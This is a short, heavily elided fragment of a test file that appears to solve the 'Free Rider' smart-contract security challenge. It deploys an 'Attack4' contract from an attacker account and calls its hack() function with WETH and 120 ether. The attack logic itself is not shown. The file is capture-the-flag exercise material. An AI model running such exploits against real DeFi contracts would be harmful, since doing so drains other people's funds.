...
describe('[Challenge] Free Rider', function () {
    ...
    it('Exploit', async function () {
        ...
        const Attack4 = await ethers.getContractFactory("Attack4", attacker)
        this.att = await Attack4.deploy(
            this.weth.address,
        ...
        await this.att.hack(this.weth.address, ethers.utils.parseEther("120"))
    });
